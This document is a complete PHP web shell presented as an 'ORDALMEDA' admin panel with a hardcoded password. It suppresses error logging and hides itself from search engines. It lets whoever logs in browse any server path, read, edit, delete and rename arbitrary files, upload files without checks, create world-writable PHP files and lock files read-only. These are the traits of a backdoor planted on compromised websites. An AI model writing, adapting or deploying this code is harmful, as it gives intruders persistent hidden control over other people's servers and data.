<?php
session_start();

// Define username and password
$valid_username = "admin";
$valid_password = "kingcv";

// Check if user is logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // $username = $_POST['username'] ?? '';
        // $password = $_POST['password'] ?? '';
        $username = isset($_POST['username']) ? $_POST['username'] : '';
        $password = isset($_POST['password']) ? $_POST['password'] : '';
        if ($username === $valid_username && $password === $valid_password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid username or password!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-black text-cyan-400">
        <div class="flex items-center justify-center min-h-screen">
            <div class="w-full max-w-md">
                <h2 class="text-3xl font-bold text-center mb-8">Login</h2>
                <?php if (isset($error)) echo "<p class='text-red-500 text-center mb-4'>$error</p>"; ?>
                <form method="POST" class="space-y-4">
                    <div>
                        <input type="text" name="username" placeholder="Username" required 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded focus:outline-none focus:border-pink-600">
                    </div>
                    <div>
                        <input type="password" name="password" placeholder="Password" required 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded focus:outline-none focus:border-pink-600">
                    </div>
                    <button type="submit" 
                        class="w-full bg-pink-500 text-white p-3 rounded hover:bg-pink-600 transition duration-200">
                        Login
                    </button>
                </form>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
    <meta name="robots" content="noindex,nofollow">
    <meta name="googlebot" content="noindex">
    <meta name="description" content="Secure Page">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-cyan-400 min-h-screen p-8">
    <div class="max-w-7xl mx-auto">
        <header class="text-center mb-8">
            <h1 class="text-5xl font-bold mb-4 text-cyan-400 drop-shadow-lg">ORDALMEDA</h1>
            <p><a href="logout.php" class="text-pink-500 hover:text-pink-400">Logout</a></p>
        </header>

        <div class="directory-nav mb-8">
            <?php
            error_reporting(0);
            ob_start();
            set_time_limit(0);
            @ini_set("memory_limit",-1);
            @ini_set('error_log',null);
            @ini_set('html_errors',0);
            @ini_set('log_errors',0);
            @ini_set('log_errors_max_len',0);
            @ini_set('display_errors',0);
            @ini_set('display_startup_errors',0);
            @ini_set('max_execution_time',0);
            @ini_set('magic_quotes_runtime', 0);

            if (isset($_GET['dir'])) {
                $dir = $_GET['dir'];
            } else {
                $dir = getcwd();
            }

            $dir = str_replace("\\", "/", $dir);
            $dirs = explode("/", $dir);

            echo '<div class="text-lg mb-4 flex flex-wrap gap-2">';
            foreach ($dirs as $key => $value) {
                if ($value == "" && $key == 0) {
                    echo '<a href="/" class="text-pink-500 hover:text-pink-400">/</a>';
                    continue;
                }
                echo '<a href="?dir=';
                for ($i=0; $i <= $key ; $i++) { 
                    echo "$dirs[$i]";
                    if ($key !== $i) echo "/";
                }
                echo '" class="text-cyan-400 hover:text-cyan-300">'.$value.'</a>/';
            }
            echo '</div>';
            echo '<div class="mb-4">';
            echo '<a href="?" class="text-pink-500 hover:text-pink-400 mr-4">[Home]</a>';
            echo '</div>';
            ?>
        </div>

        <div class="action-buttons flex flex-wrap gap-4 mb-8">
            <a href="?dir=<?php echo $dir; ?>&wibu=wibufolder" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                Create Folder
            </a>
            <a href="?dir=<?php echo $dir; ?>&wibu=wibufile" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                Create File
            </a>
            <a href="?dir=<?php echo $dir; ?>&wibu=lockfile" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                Lock File
            </a>
            <a href="?dir=<?php echo $dir; ?>&wibu=seocheck" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                SEO
            </a>
            <a href="?wibu_about" 
                class="px-4 py-2 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                About us
            </a>
        </div>

        <form enctype="multipart/form-data" method="post" class="mb-8">
            <div class="flex flex-col sm:flex-row gap-4">
                <input type="file" name="upfile" 
                    class="flex-1 p-2 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                <input type="submit" name="up" value="Upload" 
                    class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
            </div>
        </form>

        <?php
        if(isset($_POST['up'])){
            $uploadfile = $_FILES['upfile']['name'];
            if(move_uploaded_file($_FILES['upfile']['tmp_name'],$dir.'/'.$_FILES['upfile']['name'])){
                echo '<div class="bg-green-500 text-white p-4 rounded mb-4">File was successfully uploaded!</div>';
            } else {
                echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Upload failed!</div>';
            }
        }
        ?>

        <div class="overflow-x-auto">
            <table class="w-full border-collapse mb-8">
                <thead>
                    <tr>
                        <th class="border-2 border-pink-500 p-3 text-left">Name</th>
                        <th class="border-2 border-pink-500 p-3 text-left">Size</th>
                        <th class="border-2 border-pink-500 p-3 text-left">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $scan = scandir($dir);
                    foreach ($scan as $directory) {
                        if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;
                        ?>
                        <tr>
                            <td class="border-2 border-pink-500 p-3">
                                <a href="?dir=<?php echo $dir.'/'.$directory; ?>" 
                                    class="text-cyan-400 hover:text-cyan-300">
                                    <?php echo $directory; ?>
                                </a>
                            </td>
                            <td class="border-2 border-pink-500 p-3 text-center">--</td>
                            <td class="border-2 border-pink-500 p-3 text-center">NONE</td>
                        </tr>
                        <?php
                    }

                    foreach ($scan as $file) {
                        if (!is_file($dir.'/'.$file)) continue;

                        $jumlah = filesize($dir.'/'.$file)/1024;
                        $jumlah = round($jumlah, 3);
                        if ($jumlah >= 1024) {
                            $jumlah = round($jumlah/1024, 2).'MB';
                        } else {
                            $jumlah = $jumlah .'KB';
                        }
                        ?>
                        <tr>
                            <td class="border-2 border-pink-500 p-3">
                                <a href="?dir=<?php echo $dir; ?>&open=<?php echo $dir.'/'.$file; ?>" 
                                    class="text-cyan-400 hover:text-cyan-300">
                                    <?php echo $file; ?>
                                </a>
                            </td>
                            <td class="border-2 border-pink-500 p-3 text-center"><?php echo $jumlah; ?></td>
                            <td class="border-2 border-pink-500 p-3">
                                <div class="flex flex-wrap gap-2">
                                    <a href="?dir=<?php echo $dir; ?>&ubah=<?php echo $dir.'/'.$file; ?>" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        Edit
                                    </a>
                                    <a href="?dir=<?php echo $dir; ?>&delete=<?php echo $dir.'/'.$file; ?>" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        Delete
                                    </a>
                                    <a href="?dir=<?php echo $dir.'/'.$file; ?>&wibu=rename" 
                                        class="px-3 py-1 bg-black border-2 border-pink-500 text-cyan-400 rounded hover:bg-pink-500 hover:text-white transition duration-200">
                                        Rename
                                    </a>
                                </div>
                            </td>
                        </tr>
                        <?php
                    }
                    ?>
                </tbody>
            </table>
        </div>

        <?php
        if (isset($_GET['open'])) {
            echo '<div class="mb-8">';
            echo '<textarea class="w-full h-96 p-4 bg-black border-2 border-pink-500 text-cyan-400 rounded" readonly>';
            echo htmlspecialchars(file_get_contents($_GET['open']));
            echo '</textarea>';
            echo '</div>';
        }

        if (isset($_GET['delete'])) {
            if (unlink($_GET['delete'])) {
                echo "<script>alert('File deleted successfully');window.location='?dir=".$dir."';</script>";
            }
        }

        if (isset($_GET['ubah'])) {
            echo '<div class="mb-8">';
            echo '<div class="text-pink-500 mb-4">Editing file: '.basename($_GET['ubah']).'</div>';
            echo '<form method="post">';
            echo '<input type="hidden" name="object" value="'.$_GET['ubah'].'">';
            echo '<textarea name="edit" class="w-full h-96 p-4 bg-black border-2 border-pink-500 text-cyan-400 rounded mb-4">';
            echo htmlspecialchars(file_get_contents($_GET['ubah']));
            echo '</textarea>';
            echo '<div class="text-center">';
            echo '<input type="submit" value="Save" class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">';
            echo '</div>';
            echo '</form>';
            echo '</div>';
        }

        if (isset($_POST['edit'])) {
            $data = fopen($_POST["object"], 'w');
            if (fwrite($data, $_POST['edit'])) {
                echo '<div class="bg-green-500 text-white p-4 rounded mb-4">File edited successfully!</div>';
            } else {
                echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to edit file!</div>';
            }
        }

        if(isset($_REQUEST['wibu_about'])) {
            // Add your about content here
            echo '<div class="text-center mb-8">';
            echo '<h2 class="text-2xl mb-4">About Us</h2>';
            echo '<p>Your about content here</p>';
            echo '</div>';
        }

        if($_GET['wibu'] == 'wibufile') {
            ?>
            <div class="mb-8">
                <form method="post" class="space-y-4">
                    <div>
                        <label class="block mb-2">Create File:</label>
                        <input type="text" name="s" value="P4.php" 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                    </div>
                    <div>
                        <textarea name="text" 
                            class="w-full h-64 p-4 bg-black border-2 border-pink-500 text-cyan-400 rounded"></textarea>
                    </div>
                    <div>
                        <input type="submit" name="addfile" value="Create File" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                    </div>
                </form>
            </div>
            <?php
            if (isset($_POST['addfile'])) {
                $mkdir = fopen($_GET['dir'] . '/' . $_POST['s'], 'w');
                fwrite($mkdir, $_POST['text']);
                chmod($mkdir, 0777);
                if (!file_exists($mkdir)) {
                    echo '<div class="bg-green-500 text-white p-4 rounded mb-4">File created successfully!</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to create file!</div>';
                }
                fclose($mkdir);
            }
        }
        
        elseif($_GET['wibu'] == 'wibufolder') {
            ?>
            <div class="mb-8">
                <form method="post" class="space-y-4">
                    <div>
                        <label class="block mb-2">Create Folder:</label>
                        <input type="text" name="okfolder" value="P4_FOLDER" 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                    </div>
                    <div>
                        <input type="submit" name="addfolder" value="Create Folder" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                    </div>
                </form>
            </div>
            <?php
            if(isset($_POST['addfolder'])){
                $okfolder = $_GET['dir'] . '/'. $_POST['okfolder'];
                if(!empty($okfolder)){
                    $fd = mkdir($okfolder, 0777);
                    echo '<div class="bg-green-500 text-white p-4 rounded mb-4">Folder created successfully!</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to create folder!</div>';
                }
            }
        }
        
        elseif($_GET['wibu'] == 'lockfile') {
            ?>
            <div class="mb-8">
                <form method="post" class="space-y-4">
                    <div>
                        <label class="block mb-2">File Name:</label>
                        <input type="text" name="lockedfile" 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                    </div>
                    <div>
                        <input type="submit" name="locked" value="Lock File" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                    </div>
                </form>
            </div>
            <?php
            if(isset($_POST['locked'])){
                $name = $_GET['dir'] . '/'. $_POST['lockedfile'];
                chmod($name, 0444);
                if ($name) {
                    echo '<div class="bg-green-500 text-white p-4 rounded mb-4">File locked successfully: ' . $name . '</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to lock file!</div>';
                }
            }
        }
        
        elseif($_GET['wibu'] == 'seocheck') {
            echo '<div class="mb-8">';
            echo '<iframe id="content" name="content" class="w-full h-96 border-2 border-pink-500 rounded" src="https://www.google.com/search?igu=1&ei=&q=site%3A'.$_SERVER['HTTP_HOST'].'"></iframe>';
            echo '</div>';
        }
        
        elseif($_GET['wibu'] == 'rename') {
            ?>
            <div class="mb-8">
                <form method="post" class="space-y-4">
                    <div>
                        <label class="block mb-2">Rename to:</label>
                        <input type="text" name="fol_rename" value="<?php echo basename($dir); ?>" 
                            class="w-full p-3 bg-black border-2 border-pink-500 text-cyan-400 rounded">
                    </div>
                    <div>
                        <input type="submit" name="dir_rename" value="Rename" 
                            class="px-6 py-2 bg-pink-500 text-white rounded hover:bg-pink-600 cursor-pointer">
                    </div>
                </form>
            </div>
            <?php
            if(isset($_POST['dir_rename'])) {
                $dir_rename = rename($dir, dirname($dir)."/".htmlspecialchars($_POST['fol_rename']));
                if($dir_rename) {
                    echo '<div class="bg-green-500 text-white p-4 rounded mb-4">Renamed successfully!</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-4 rounded mb-4">Failed to rename!</div>';
                }
            }
        }
        ?>

        <footer class="text-center mt-8 border-t-2 border-pink-500 pt-4">
            <p>© 2025 ORDALMEDA. <a href="?die" class="text-pink-500 hover:text-pink-400">Log Out</a></p>
            <hr class="w-3/5 mx-auto border-pink-500 my-4">
        </footer>
    </div>
</body>
</html>

<?php
// Logout script
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
